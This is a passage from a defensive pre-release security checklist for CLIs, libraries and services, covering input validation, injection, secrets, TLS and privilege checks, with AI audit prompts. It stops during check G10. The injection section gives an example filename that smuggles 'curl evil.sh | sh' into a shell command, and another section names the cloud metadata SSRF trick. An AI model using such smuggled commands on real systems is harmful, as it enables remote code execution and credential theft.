# Security (General)

> Pre-release security toolkit for everything that is not a website or a mobile/desktop app: CLIs, libraries, SDKs, scripts, bots, daemons and backend services. 16 checks, a copy-paste prompt for each, quick self-tests, and a final test-and-report workflow.

**Pick the right toolkit:** [Web](security-web.md) | [App](security-app.md) | **General (this file)**

Use this as the default ("else") toolkit. For web apps use the Web toolkit. For installed mobile and desktop apps use the App toolkit. A project can use more than one (for example a service with a web dashboard).

---

## Contents

- [Read this first](#read-this-first)
- [Your first hour and red flags](#your-first-hour-and-red-flags)
- [The checklist](#the-checklist)
- [00. Project context and map](#00-project-context-and-map)
- [Checks](#checks)
- [Bonus checks](#bonus-checks)
- [Emergency card](#emergency-card-if-something-goes-wrong)
- [Keep it secure after release](#keep-it-secure-after-release)
- [What your final report looks like](#what-your-final-report-looks-like)
- [Glossary](#glossary)

| # | Check | Severity |
|---|-------|----------|
| G01 | [Validate every input at the boundary](#g01-validate-every-input-at-the-boundary) | HIGH |
| G02 | [Prevent command, SQL and path injection](#g02-prevent-command-sql-and-path-injection) | CRITICAL |
| G03 | [Keep secrets out of code, config and logs](#g03-keep-secrets-out-of-code-config-and-logs) | CRITICAL |
| G04 | [Handle files and temporary data safely](#g04-handle-files-and-temporary-data-safely) | HIGH |
| G05 | [Secure network calls and TLS](#g05-secure-network-calls-and-tls) | HIGH |
| G06 | [Authenticate and authorize any service or API](#g06-authenticate-and-authorize-any-service-or-api) | CRITICAL |
| G07 | [Avoid unsafe deserialization and code execution](#g07-avoid-unsafe-deserialization-and-code-execution) | CRITICAL |
| G08 | [Run with least privilege and sandbox](#g08-run-with-least-privilege-and-sandbox) | HIGH |
| G09 | [Use cryptography correctly](#g09-use-cryptography-correctly) | HIGH |
| G10 | [Limit resources and prevent denial of service](#g10-limit-resources-and-prevent-denial-of-service) | MEDIUM |
| G11 | [Control errors, logging and information leaks](#g11-control-errors-logging-and-information-leaks) | MEDIUM |
| G12 | [Update dependencies, lock and verify them](#g12-update-dependencies-lock-and-verify-them) | HIGH |
| G13 | [Secure CI, builds and releases](#g13-secure-ci-builds-and-releases) | HIGH |
| G14 | [Publish a security policy and handle reports](#g14-publish-a-security-policy-and-handle-reports) | MEDIUM |
| G15 | [Run a thorough security review](#g15-run-a-thorough-security-review) | REVIEW |
| G16 | [Test the protections and give me a report](#g16-test-the-protections-and-give-me-a-report) | VERIFY |

---

## Read this first

Programs that run on someone else's machine, or accept data from someone else, inherit all of their risk: hostile input, leaked credentials, over-trusted dependencies and a release pipeline attackers would love to hijack. You do not need to be a security expert, you just need to know what to ask, and how to check the answer.

### How to use this toolkit

1. **Save a checkpoint.** Commit your code and work on a branch. If anything breaks, you can roll back.
2. **Map your project.** Fill in the Project Context block, then run Prompt 00. Claude creates `SECURITY_MAP.md`.
3. **Work through the checks.** Run checks one at a time. Do the 2-minute self-check, paste the prompt, review the changes, tick "Done when".
4. **Review, test, report.** Run the review check, then the final test-and-report check to prove every fix and get `SECURITY_REPORT.md`.

### How each check is laid out

| Block | Purpose |
|-------|---------|
| What this means | The idea in plain English, no jargon. |
| What goes wrong | A realistic attack on a typical project. |
| 2-minute self-check | A quick test you can run yourself, before and after. |
| Claude prompt | A detailed, copy-paste prompt: audit, fix, verify, report. |
| Done when | Clear finish line. Do not move on until every box is true. |
| Watch out for | Common traps and stack-specific gotchas. |

### Tips for getting great results

- **Give the AI your whole codebase.** Use a tool that can read and edit files (Claude Code, Cursor, Windsurf, or similar).
- **One check per conversation.** Start fresh each time and paste your Project Context first.
- **Read the findings table before accepting changes.** If something does not make sense, ask "show me the code that proves this".
- **Never paste real secrets into a chat.** Refer to them by variable name.
- **Test after every check.** Run the app or tool and its tests. Security fixes occasionally break things.

> [!NOTE]
> **An honest note.** AI reviewers can miss real problems and occasionally invent fake ones. This toolkit raises your baseline but is not a guarantee. If you handle payments, health data, children's data or many users, get a professional review before release.

> [!TIP]
> **Library or SDK?** Your users are your callers. Treat every public function argument as untrusted (G01), keep dependencies minimal (G12), and publish a security policy (G14). **CLI or script?** Focus on G02, G03, G04, G07 and G08.

---

## Your first hour and red flags

If you are releasing soon and can only do a little, do these in this order.

1. **G03** Keep secrets out of code, config and logs
2. **G13** Secure CI, builds and releases
3. **G02** Prevent command, SQL and path injection
4. **G12** Update dependencies, lock and verify them
5. **G07** Avoid unsafe deserialization and code execution
6. **G06** Authenticate any service or API
7. **G01** Validate every input at the boundary
8. **G14** Publish a security policy

**Red flags: drop everything if any is true**

| Red flag | Go to |
|----------|-------|
| A secret or token is in the repository, its history or a published package | G03, G13 |
| The program builds shell commands or SQL from input strings | G02 |
| A listener is bound to 0.0.0.0 with no authentication | G06 |
| It loads pickle, unsafe YAML or runs eval on data from outside | G07 |
| TLS verification is turned off (verify=False, -k, InsecureSkipVerify) | G05 |
| It runs as root or administrator for no clear reason | G08 |
| CI exposes secrets to pull requests from forks | G13 |
| A dependency was suggested by an AI and never verified | G12 |
| Passwords are hashed with MD5/SHA or stored in plain text | G09 |
| There is no private way to report a vulnerability | G14 |

---

## The checklist

| # | Check | Severity | Notes / date done |
|---|-------|----------|-------------------|
| | **Identity & Access** | | |
| G06 | Authenticate and authorize any service or API | CRITICAL | |
| | **Secrets & Keys** | | |
| G03 | Keep secrets out of code, config and logs | CRITICAL | |
| G09 | Use cryptography correctly | HIGH | |
| | **Data & Inputs** | | |
| G01 | Validate every input at the boundary | HIGH | |
| G02 | Prevent command, SQL and path injection | CRITICAL | |
| G04 | Handle files and temporary data safely | HIGH | |
| G07 | Avoid unsafe deserialization and code execution | CRITICAL | |
| | **Network & Browser** | | |
| G05 | Secure network calls and TLS | HIGH | |
| G10 | Limit resources and prevent denial of service | MEDIUM | |
| | **Deployment & Supply Chain** | | |
| G08 | Run with least privilege and sandbox | HIGH | |
| G12 | Update dependencies, lock and verify them | HIGH | |
| G13 | Secure CI, builds and releases | HIGH | |
| | **Monitoring & Response** | | |
| G11 | Control errors, logging and information leaks | MEDIUM | |
| G14 | Publish a security policy and handle reports | MEDIUM | |
| G15 | Run a thorough security review | REVIEW | |
| G16 | Test the protections and give me a report | VERIFY | |

---

## 00. Project context and map

`SETUP` | 10 min | do this first

> Give Claude the big picture once, so every check after this is sharper.

Fill in the block below once, save it, and paste it at the top of every new conversation, before the check's prompt.

```text
PROJECT CONTEXT (paste this above any prompt in this toolkit)
- What it does: [e.g. CLI that converts and tags audio files]
- Kind: [CLI / library / SDK / script / bot / daemon / backend service / other]
- Who uses it: [me / my team / public via package registry / customers]
- Language and runtime: [e.g. Python 3.12, Go 1.23, Rust, Node.js, Dart]
- Tools used to build it: [Claude Code / Cursor / other]
- Distribution: [package registry / GitHub releases / Docker image / source only]
- Runs as: [normal user / root or admin / container / service]
- Input sources: [args, files, stdin, env, network, plugins]
- Listens on the network: [no / yes: port, address]
- Secrets handled: [API keys, tokens, passwords, certificates...]
- Status: [not released yet / live with ___ users]
- Anything I'm worried about: [optional]
```

Then run Prompt 00. It creates `SECURITY_MAP.md`, a single map of your entry points, data, secrets and risky features. Later prompts use it.

**Claude prompt (00): map my project** - run once at the start:

```text
Act as a senior software security engineer. Before we change anything, I want you to fully understand this project's security surface. Inspect the whole codebase. Do NOT modify any code in this step.

Create a file called SECURITY_MAP.md containing:
1. Stack: languages, runtimes and versions, package manager, build system, how it is distributed.
2. Entry points: a table of EVERY way input reaches the program: CLI commands and flags, public API functions, config files, environment variables, stdin, files and formats parsed, network listeners, IPC, plugin hooks. Include: name, purpose, who can call it, inputs accepted.
3. Data and files: what it reads, writes, stores or deletes, where, and with which permissions.
4. Privileges: which user it runs as, what it can access, anything that needs elevation.
5. External calls: processes it runs, network hosts it contacts, URLs it fetches, and with which libraries.
6. Secrets: names only (NEVER values), where each is used and how it is supplied.
7. Dependencies: direct and notable transitive packages, install scripts, lockfile status.
8. Build and release: CI workflows, secrets used, who can publish, how artifacts are signed.
9. Risky features: deserialization, eval, plugins, auto-update, archive extraction, templating, AI/LLM calls.
10. Questions: anything you could not determine from the code that I need to answer.

Then give me your TOP 5 security concerns, ranked, in plain English, each with the check number from this toolkit that addresses it. No fixes yet.
```

---

## Checks

Each check follows the same layout. Run one check per conversation.

## G01. Validate every input at the boundary

`HIGH` | Data & Inputs | 20-40 min

> Everything that crosses into your program is untrusted: arguments, files, stdin, environment, network data and plugin output.

**What this means**

A CLI, library or service receives data from callers and files you do not control. Validate type, size, range and format where the data enters, and fail safely. Most later bugs (injection, crashes, resource exhaustion) start with an input nobody checked.

**What goes wrong**

A CLI accepts a --count argument and allocates memory from it. Someone passes 999999999999 and the process is killed. A config parser trusts a field that is meant to be a number and gets a nested object.

**2-minute self-check**

- List every input source (flags, config files, env vars, stdin, files, network, plugins) and try each with empty, huge, negative, wrong-type and unexpected-encoding values.
- Run a fuzzer or property tests on your main parsers for 5 minutes (for example Go fuzzing, cargo-fuzz, Hypothesis, jazzer, AFL++).
- Check the program fails with a clear error, not a crash, hang or partial write.

**Claude prompt (G01)** - paste your Project Context first, then this:

```text
Act as a senior software security engineer. Make sure every input is validated at the point where it enters this program.

AUDIT
1. List every entry point: CLI commands and flags, public API functions, config files, environment variables, stdin, network listeners, file formats parsed and plugin hooks.
2. For each input, check validation of type, length, range, format and encoding at the boundary, using an allowlist rather than a blocklist.
3. Check numeric handling for overflow, negative values and unit confusion, and text handling for encoding and normalization issues.
4. Check public library functions validate arguments and do not rely on callers behaving.
5. Check errors are returned or raised consistently, without leaving partial state.

FIX
- Add central validation functions and call them at each boundary.
- Add explicit size, depth and count limits.
- Add tests for hostile and malformed inputs.

VERIFY
Give me a table of entry point, input, validation, and a test for each that proves bad input is rejected safely.

HOW TO WORK
- Audit first, and show me what you found before making large changes.
- Fix Critical and High issues directly. Ask me before any change users would notice (logging people
out, blocking a feature, changing a flow).
- Fix the root cause with the smallest safe change. Don't remove features, weaken other protections, or
leave "TODO: secure later" comments.
- If you add a package, name it, say why, and confirm it is a real, well-maintained package (not a look-
alike name).
- Never print real secret values; refer to them by variable name.
- If something lives outside the code (package registry, CI, hosting or account settings), give me exact click-by-click steps
instead.

FINISH WITH
1. Findings table: issue · file:line · severity · status (Fixed / Needs my action / Not applicable)
2. Files changed
3. How I can verify it myself in under 5 minutes
```

**Done when**

- [ ] Every entry point validates its input with an allowlist.
- [ ] Bad input gives a clear error, never a crash or partial write.
- [ ] Limits exist for size, depth and counts.
- [ ] Tests cover malformed and hostile inputs.

**Watch out for**

- **Validate, then use.** Do not validate in one place and parse differently in another.
- **Library authors:** your callers are inputs too.
- **Fuzzing finds what you did not imagine.** Keep a corpus.

---

## G02. Prevent command, SQL and path injection

`CRITICAL` | Data & Inputs | 20-40 min

> Data must never be able to change the meaning of a command, query or path.

**What this means**

Injection happens when untrusted text is glued into something that gets interpreted: a shell command, a SQL query, a file path, a template or a regular expression. The fix is to keep code and data separate, using arguments arrays, parameterized queries and safe path joins.

**What goes wrong**

A tool runs os.system("convert " + filename). A file named "a.png; curl evil.sh | sh" runs arbitrary commands. Or a download feature joins a user-supplied name onto a folder and a name with ../ overwrites system files.

**2-minute self-check**

- Search the code for shell calls (system, exec, popen, subprocess with shell=True, backticks), string-built SQL, eval and template rendering with user data.
- Try inputs with ; | $( ) quotes, newlines, ../ and null bytes in every place a filename, name or query reaches a command or path.
- Check the program never runs through a shell when it does not need to.

**Claude prompt (G02)** - paste your Project Context first, then this:

```text
Act as a senior software security engineer. Find and fix every command, SQL, path and template injection risk.

AUDIT
1. Find every place the program runs another process, builds a query, builds a path, renders a template or compiles a regular expression from input.
2. Process execution must use argument arrays with no shell, absolute paths for executables where possible, and a minimal environment.
3. Databases must use parameterized queries or the ORM, never string concatenation.
4. Paths must be resolved and checked to stay inside an intended base directory (reject .., absolute paths, symlink escapes).
5. Regular expressions built from input must be escaped, and complex patterns checked for catastrophic backtracking.

FIX
- Replace every unsafe call with the safe API. Add allowlists where input selects an action or file.

VERIFY
Write tests with injection payloads for each sink and show each is treated as plain data.

HOW TO WORK
- Audit first, and show me what you found before making large changes.
- Fix Critical and High issues directly. Ask me before any change users would notice (logging people
out, blocking a feature, changing a flow).
- Fix the root cause with the smallest safe change. Don't remove features, weaken other protections, or
leave "TODO: secure later" comments.
- If you add a package, name it, say why, and confirm it is a real, well-maintained package (not a look-
alike name).
- Never print real secret values; refer to them by variable name.
- If something lives outside the code (package registry, CI, hosting or account settings), give me exact click-by-click steps
instead.

FINISH WITH
1. Findings table: issue · file:line · severity · status (Fixed / Needs my action / Not applicable)
2. Files changed
3. How I can verify it myself in under 5 minutes
```

**Done when**

- [ ] No shell is used with untrusted data.
- [ ] All SQL is parameterized.
- [ ] Path handling is confined to a base directory.
- [ ] Tests with hostile payloads pass.

**Watch out for**

- **Escaping by hand fails.** Use the safe API instead.
- **Filenames are input.** So are branch names, tags and metadata from other systems.
- **Windows is different.** Check quoting and reserved names if you support it.

---

## G03. Keep secrets out of code, config and logs

`CRITICAL` | Secrets & Keys | 15-30 min

> Credentials live in a secrets manager or the environment, never in the repository, the build or the logs.

**What this means**

API keys, tokens, passwords and private keys end up in source, example configs, test fixtures, CI logs, error messages and published packages. Once published, they are public forever and bots find them within minutes.

**What goes wrong**

A test fixture contains a real token. The package is published to the registry, scraped by a bot, and the token is used to run up costs or to read private data.

**2-minute self-check**

- Run a secret scanner on the working tree and the whole Git history (gitleaks, trufflehog).
- Search the code for api_key, token, password, secret, BEGIN PRIVATE KEY and long random strings, including tests and docs.
- Build or pack the release artifact and list its contents. Does it contain .env files, credentials or test fixtures with real data?

**Claude prompt (G03)** - paste your Project Context first, then this:

```text
Act as a senior software security engineer. Find every secret in the code, config, history and artifacts, and make sure none is stored or logged.

AUDIT
1. Search code, config, fixtures, docs and the Git history for hard-coded secrets and list each with its location.
2. Check how the program receives secrets (environment variable, secret manager, OS keychain, prompt) and that they are never passed on the command line (visible in process lists).
3. Check logs, error messages and debug output never print secrets or full request headers.
4. Check .gitignore and the package manifest exclude .env files, credentials and local config from commits and published packages.
5. Check example config files use obvious placeholders.

FIX
- Move secrets out of code. Add a pre-commit secret scan and a CI scan.
- Add file excludes for packaging.
- List every secret that has EVER been committed so I can rotate it (G13).

VERIFY
Show me clean scan results for the tree, the history and the packaged artifact.

HOW TO WORK
- Audit first, and show me what you found before making large changes.
- Fix Critical and High issues directly. Ask me before any change users would notice (logging people
out, blocking a feature, changing a flow).
- Fix the root cause with the smallest safe change. Don't remove features, weaken other protections, or
leave "TODO: secure later" comments.
- If you add a package, name it, say why, and confirm it is a real, well-maintained package (not a look-
alike name).
- Never print real secret values; refer to them by variable name.
- If something lives outside the code (package registry, CI, hosting or account settings), give me exact click-by-click steps
instead.

FINISH WITH
1. Findings table: issue · file:line · severity · status (Fixed / Needs my action / Not applicable)
2. Files changed
3. How I can verify it myself in under 5 minutes
```

**Done when**

- [ ] Scanners find no secrets in the tree, history or artifact.
- [ ] Secrets are never in command-line arguments or logs.
- [ ] Published packages exclude local and credential files.
- [ ] A rotation list exists for anything ever exposed.

**Watch out for**

- **Deleting a file does not remove it from history.** Rotate instead.
- **Test data** with real tokens is a classic leak.
- **Package contents:** check what actually ships (npm pack, python build, cargo package).

---

## G04. Handle files and temporary data safely

`HIGH` | Data & Inputs | 20-40 min

> Files are created, read and extracted with safe permissions and no surprises.

**What this means**

Insecure temp files, world-readable outputs, symlink tricks and archive extraction (zip slip) turn small tools into ways to overwrite or read files they should never touch.

**What goes wrong**

A tool extracts a user-supplied archive. One entry is named ../../.bashrc and the tool happily overwrites it. Another tool writes a predictable temp file in /tmp that a local attacker replaces with a symlink.

**2-minute self-check**

- Search for temp file creation with fixed or predictable names and for archive extraction code.
- Extract an archive containing ../ entries and symlinks into a test folder. Nothing may escape the folder.
- Check permissions on files the tool creates (ls -l). Credentials and private data should be 0600 or similar.

**Claude prompt (G04)** - paste your Project Context first, then this:

```text
Act as a senior software security engineer. Make sure all file handling, temporary files and archive extraction are safe.

AUDIT
1. List every place the program creates, reads, writes, moves, deletes or extracts files.
2. Temp files must use secure APIs (mkstemp, tempfile, os.CreateTemp) in private directories, never fixed names.
3. Created files and directories must have the least permissive mode needed, and umask handled explicitly for secrets.
4. Archive extraction must reject absolute paths, .. segments and escaping symlinks, and limit total size and file count.
5. Check for time-of-check to time-of-use races, and that writes are atomic where corruption would matter (write temp, then rename).

FIX
- Switch to safe temp APIs, set explicit permissions, and harden extraction.

VERIFY
Write tests for path escape, symlink and permission cases and show they pass.

HOW TO WORK
- Audit first, and show me what you found before making large changes.
- Fix Critical and High issues directly. Ask me before any change users would notice (logging people
out, blocking a feature, changing a flow).
- Fix the root cause with the smallest safe change. Don't remove features, weaken other protections, or
leave "TODO: secure later" comments.
- If you add a package, name it, say why, and confirm it is a real, well-maintained package (not a look-
alike name).
- Never print real secret values; refer to them by variable name.
- If something lives outside the code (package registry, CI, hosting or account settings), give me exact click-by-click steps
instead.

FINISH WITH
1. Findings table: issue · file:line · severity · status (Fixed / Needs my action / Not applicable)
2. Files changed
3. How I can verify it myself in under 5 minutes
```

**Done when**

- [ ] Temp files use secure APIs.
- [ ] Created files have minimal permissions.
- [ ] Archive extraction cannot escape its folder.
- [ ] Critical writes are atomic.

**Watch out for**

- **Never trust names inside archives.**
- **Symlinks** can redirect writes. Resolve before checking.
- **Cleanup:** make sure temp files are removed on errors too.

---

## G05. Secure network calls and TLS

`HIGH` | Network & Browser | 15-30 min

> Every outgoing connection verifies who it talks to and cannot be tricked into reaching places it should not.

**What this means**

Programs call APIs, download files and fetch URLs. Disabled certificate checks, plain HTTP, missing timeouts and unrestricted URL fetching make them easy to eavesdrop on, hang, or abuse to reach internal systems (SSRF).

**What goes wrong**

A CLI sets verify=False "to fix a certificate error". Anyone on the network can read or modify its traffic. A fetch-URL feature is pointed at http://169.254.169.254 and returns cloud credentials.

**2-minute self-check**

- Search for disabled verification (verify=False, InsecureSkipVerify, rejectUnauthorized: false, curl -k) and http:// URLs.
- Check every network call has a timeout and a maximum response size.
- If a feature fetches user-supplied URLs, try internal addresses (127.0.0.1, 169.254.169.254, private ranges).

**Claude prompt (G05)** - paste your Project Context first, then this:

```text
Act as a senior software security engineer. Make sure all network connections are verified, bounded and cannot be abused to reach internal systems.

AUDIT
1. List every outgoing and incoming network connection and the library used.
2. TLS verification must be enabled everywhere. No insecure fallbacks to HTTP.
3. Every call must set connect and read timeouts, size limits and a sane retry policy with backoff.
4. Downloads that are executed or installed must be verified with a checksum or signature.
5. Any feature that fetches user-supplied URLs must allow only http/https, resolve the host and block private, loopback and link-local ranges (including cloud metadata) for the first request and every redirect, preferably with a domain allowlist.

FIX
- Remove insecure settings, add timeouts and limits, and add URL fetching protection.

VERIFY
Show me tests with internal addresses and a bad certificate that fail safely.

HOW TO WORK
- Audit first, and show me what you found before making large changes.
- Fix Critical and High issues directly. Ask me before any change users would notice (logging people
out, blocking a feature, changing a flow).
- Fix the root cause with the smallest safe change. Don't remove features, weaken other protections, or
leave "TODO: secure later" comments.
- If you add a package, name it, say why, and confirm it is a real, well-maintained package (not a look-
alike name).
- Never print real secret values; refer to them by variable name.
- If something lives outside the code (package registry, CI, hosting or account settings), give me exact click-by-click steps
instead.

FINISH WITH
1. Findings table: issue · file:line · severity · status (Fixed / Needs my action / Not applicable)
2. Files changed
3. How I can verify it myself in under 5 minutes
```

**Done when**

- [ ] TLS verification is on everywhere.
- [ ] All calls have timeouts and size limits.
- [ ] Downloaded code or data is verified.
- [ ] URL-fetching features block internal addresses.

**Watch out for**

- **"It works with verify off"** means a certificate problem you must fix, not hide.
- **Redirects** can lead to internal hosts. Check each hop.
- **Proxies and corporate CAs:** support them with a config option, not by disabling checks.

---

## G06. Authenticate and authorize any service or API

`CRITICAL` | Identity & Access | 30-60 min

> If your tool listens on a port, a socket or a pipe, decide exactly who may talk to it.

**What this means**

Daemons, local servers, admin interfaces, RPC and plugin sockets are often bound to all interfaces with no login "for convenience". Any process or machine that can reach them can use them, and local web pages can often reach localhost too.

**What goes wrong**

A development server binds 0.0.0.0 with an unauthenticated admin endpoint. It gets exposed on a shared network or a cloud host and anyone can run commands through it.

**2-minute self-check**

- List listening ports and sockets (ss -ltnp, lsof -i) while the program runs. Which addresses are they bound to?
- Call every endpoint without credentials from another machine or container. What happens?
- If it listens on localhost, check if a web page could reach it (CORS, DNS rebinding).

**Claude prompt (G06)** - paste your Project Context first, then this:

```text
Act as a senior software security engineer. Make sure every listener this program opens is authenticated, authorized and safely bound.

AUDIT
1. List every listener (TCP, UDP, Unix socket, named pipe, IPC, plugin interface) and what it exposes.
2. Default to binding to localhost or a Unix socket with strict permissions. Require an explicit flag to expose more.
3. Require authentication for anything that reads or changes data, using proven mechanisms (tokens generated at first run, mutual TLS, OS-level peer credentials).
4. Enforce authorization per operation (admin vs read-only) on the server side of the connection.
5. Defend local servers against browser-based attacks: check the Host and Origin headers, no permissive CORS.

FIX
- Apply safe defaults and add authentication and authorization. Document how users enable remote access safely.

VERIFY
Give me commands that show unauthenticated and wrong-role requests are rejected, and that default binding is local only.

HOW TO WORK
- Audit first, and show me what you found before making large changes.
- Fix Critical and High issues directly. Ask me before any change users would notice (logging people
out, blocking a feature, changing a flow).
- Fix the root cause with the smallest safe change. Don't remove features, weaken other protections, or
leave "TODO: secure later" comments.
- If you add a package, name it, say why, and confirm it is a real, well-maintained package (not a look-
alike name).
- Never print real secret values; refer to them by variable name.
- If something lives outside the code (package registry, CI, hosting or account settings), give me exact click-by-click steps
instead.

FINISH WITH
1. Findings table: issue · file:line · severity · status (Fixed / Needs my action / Not applicable)
2. Files changed
3. How I can verify it myself in under 5 minutes
```

**Done when**

- [ ] Default binding is not public.
- [ ] Every non-public operation requires authentication.
- [ ] Authorization is enforced per operation.
- [ ] Local servers resist browser-based attacks.

**Watch out for**

- **No listeners?** Mark this check N/A.
- **Web service?** Use the Web toolkit for the HTTP layer.
- **Tokens in URLs** end up in logs. Use headers.

---

## G07. Avoid unsafe deserialization and code execution

`CRITICAL` | Data & Inputs | 20-40 min

> Loading data must never run code, and plugins must not be a free pass.

**What this means**

Some formats can create arbitrary objects or run code when loaded (pickle, unsafe YAML, Java serialization, eval, dynamic imports, some template engines). Plugins and auto-updaters are code execution by design, so they need strict trust rules.

**What goes wrong**

A tool loads a saved session with pickle.load. A shared session file contains a crafted payload that runs a shell command the moment someone opens it.

**2-minute self-check**

- Search for pickle, marshal, yaml.load (without safe loader), eval, exec, Function(), unserialize, ObjectInputStream, dynamic import and template rendering of untrusted text.
- Load a hostile file in each format the program reads. It must be rejected or treated as plain data.
- Check where plugins, scripts and update packages come from.

**Claude prompt (G07)** - paste your Project Context first, then this:

```text
Act as a senior software security engineer. Make sure loading data never executes code and that plugins and updates are verified.

AUDIT
1. Find every deserialization, eval-like call, dynamic import and plugin or update mechanism.
2. Replace unsafe formats with safe ones (JSON, safe YAML loaders, schema-validated formats). Never load pickle or similar from untrusted sources.
3. Validate structure against a schema after parsing.
4. Plugins and updates must come from trusted, verified sources (signatures or pinned hashes), run with minimal permissions, and be opt-in.
5. Check template engines run in sandboxed mode and never render user-controlled templates.

FIX
- Swap unsafe loaders for safe ones, add schema validation, and add verification for plugins and updates.

VERIFY
Add tests that load hostile payloads in each format and show no code runs.

HOW TO WORK
- Audit first, and show me what you found before making large changes.
- Fix Critical and High issues directly. Ask me before any change users would notice (logging people
out, blocking a feature, changing a flow).
- Fix the root cause with the smallest safe change. Don't remove features, weaken other protections, or
leave "TODO: secure later" comments.
- If you add a package, name it, say why, and confirm it is a real, well-maintained package (not a look-
alike name).
- Never print real secret values; refer to them by variable name.
- If something lives outside the code (package registry, CI, hosting or account settings), give me exact click-by-click steps
instead.

FINISH WITH
1. Findings table: issue · file:line · severity · status (Fixed / Needs my action / Not applicable)
2. Files changed
3. How I can verify it myself in under 5 minutes
```

**Done when**

- [ ] No untrusted data goes through an unsafe loader.
- [ ] Parsed data is schema-validated.
- [ ] Plugins and updates are verified and opt-in.
- [ ] Hostile payload tests pass.

**Watch out for**

- **"Only our own files"** is not enough when files can be shared or tampered with.
- **Auto-update** is a supply chain risk. Sign what you ship.
- **eval is almost never needed.**

---

## G08. Run with least privilege and sandbox

`HIGH` | Deployment & Supply Chain | 20-40 min

> If something goes wrong, the damage should be limited to what the program genuinely needs.

**What this means**

Running as root or administrator, with full filesystem and network access, means any bug becomes a full compromise. Dropping privileges and restricting access shrinks the blast radius.

**What goes wrong**

A bug in a media tool running as root lets a crafted file read /etc/shadow. As a normal user in a restricted container the same bug reads nothing important.

**2-minute self-check**

- Run the program and check which user it runs as and which files and network it can reach.
- Try running it as a non-root user with a read-only filesystem except its data folder. What breaks?
- Check container images and service files for USER, capabilities and mounts.

**Claude prompt (G08)** - paste your Project Context first, then this:

```text
Act as a senior software security engineer. Make sure the program runs with the least privilege it needs and has a sensible sandbox.

AUDIT
1. List the privileges the program actually needs: files, network, devices, capabilities.
2. Make it work as a non-root, non-admin user. Drop privileges as early as possible and never keep elevated rights longer than needed.
3. Recommend sandboxing for the platform: containers with a non-root user, read-only root filesystem and dropped capabilities; systemd hardening options; seccomp, AppArmor or SELinux profiles; macOS and Windows sandboxes.
4. Never ask users to run installers or tools with sudo when it is not required, and avoid world-writable install locations.
5. Check config and data folders have correct ownership and permissions.

FIX
- Apply least-privilege defaults and document the minimal permissions needed.

VERIFY
Show me the program running as a restricted user or container and listing what it can and cannot access.

HOW TO WORK
- Audit first, and show me what you found before making large changes.
- Fix Critical and High issues directly. Ask me before any change users would notice (logging people
out, blocking a feature, changing a flow).
- Fix the root cause with the smallest safe change. Don't remove features, weaken other protections, or
leave "TODO: secure later" comments.
- If you add a package, name it, say why, and confirm it is a real, well-maintained package (not a look-
alike name).
- Never print real secret values; refer to them by variable name.
- If something lives outside the code (package registry, CI, hosting or account settings), give me exact click-by-click steps
instead.

FINISH WITH
1. Findings table: issue · file:line · severity · status (Fixed / Needs my action / Not applicable)
2. Files changed
3. How I can verify it myself in under 5 minutes
```

**Done when**

- [ ] The program runs without root or administrator rights.
- [ ] Containers and services use restricted users and capabilities.
- [ ] Install steps do not require unnecessary elevation.
- [ ] Folder permissions are minimal.

**Watch out for**

- **sudo in README instructions** is a smell. Question it.
- **Sandboxes are layers**, not replacements for fixing bugs.
- **Docker:** USER defaults to root unless you change it.

---

## G09. Use cryptography correctly

`HIGH` | Secrets & Keys | 20-40 min

> Use proven libraries and defaults. Never invent or glue together your own cryptography.

**What this means**

Common failures are home-made algorithms, weak hashes for passwords, predictable random numbers, hard-coded keys and IVs, ECB mode, and comparing secrets with ordinary string comparison.

**What goes wrong**

A tool stores passwords as MD5 and generates tokens with Math.random(). Tokens are guessable and passwords are cracked within hours after a leak.

**2-minute self-check**

- Search for md5, sha1, des, rc4, ecb, Math.random, rand(), random.random used for secrets, and hard-coded keys or IVs.
- Check how passwords, tokens and keys are generated, stored and compared.
- Check where encryption keys come from and where they are stored.

**Claude prompt (G09)** - paste your Project Context first, then this:

```text
Act as a senior software security engineer. Make sure all cryptography uses proven libraries and safe defaults.

AUDIT
1. List every use of hashing, encryption, signatures, random numbers and key storage.
2. Passwords must use Argon2id, scrypt or bcrypt. Integrity and signatures must use modern algorithms (SHA-256 or better, Ed25519, ECDSA P-256).
3. Encryption must use authenticated modes (AES-GCM, ChaCha20-Poly1305) from a high-level library such as libsodium, with unique random nonces.
4. Secrets and tokens must come from a cryptographically secure random source and be compared in constant time.
5. Keys must not be hard-coded and must have a rotation plan.

FIX
- Replace weak or custom crypto with vetted libraries and safe defaults.
- Add a migration path for existing hashes or encrypted data.

VERIFY
Show me tests that prove weak algorithms are gone and that existing data still decrypts or verifies after migration.

HOW TO WORK
- Audit first, and show me what you found before making large changes.
- Fix Critical and High issues directly. Ask me before any change users would notice (logging people
out, blocking a feature, changing a flow).
- Fix the root cause with the smallest safe change. Don't remove features, weaken other protections, or
leave "TODO: secure later" comments.
- If you add a package, name it, say why, and confirm it is a real, well-maintained package (not a look-
alike name).
- Never print real secret values; refer to them by variable name.
- If something lives outside the code (package registry, CI, hosting or account settings), give me exact click-by-click steps
instead.

FINISH WITH
1. Findings table: issue · file:line · severity · status (Fixed / Needs my action / Not applicable)
2. Files changed
3. How I can verify it myself in under 5 minutes
```

**Done when**

- [ ] No custom or deprecated algorithms remain.
- [ ] Passwords use a slow salted hash.
- [ ] Random values for secrets are cryptographically secure.
- [ ] Keys are not hard-coded and can be rotated.

**Watch out for**

- **No crypto needed?** Do not add it. Less is safer.
- **Rolling your own** is the mistake to avoid, even if it looks small.
- **Migrate gradually** so you do not lock users out.

---

## G10. Limit resources and prevent denial of service

`MEDIUM` | Network & Browser | 20-40 min

> One bad input should not be able to take the program down or exhaust a machine.

**What this means**

Unbounded loops, recursion, memory allocation, file sizes, request counts and slow regular expressions let a single input freeze or crash a program, or make a service unavailable for everyone.

**What goes wrong**

A JSON parser accepts arbitrarily nested arrays. A tiny file nests 100000 levels deep and crashes the process with a stack overflow. A regex with nested quantifiers hangs on a long string.

**2-minute self-check**

- Feed very large files, deeply nested data, a huge number of items and very long strings. Watch memory and CPU.
- Search for regular expressions with nested quantifiers and test them with long near-matching strings.
- For services, send many concurrent requests and slow connections. Does it stay responsive?

**Claude prompt (G10)** - paste your Project Context first, then this:

```text
Act as a senior software security engineer. Make sure bad or huge inputs cannot exhaust resources or hang the program.

AUDIT
1. List every place that allocates memory, loops, recurses, spawns work or waits on external resources based on input.
2. Add limits for size, depth, count, time and concurrency, with sensible defaults.
3. Use timeouts on every external call and cancellation for long operations.
4. For services, add rate limits, connection limits and queue bounds.
5. Review regular expressions for catastrophic backtracking, or use a linear-time engine.

FIX
- Add the limits and fail with clear errors when exceeded.

VERIFY
Write tests with oversized, deeply nested and slow inputs that show the program stays within limits.

HOW TO WORK
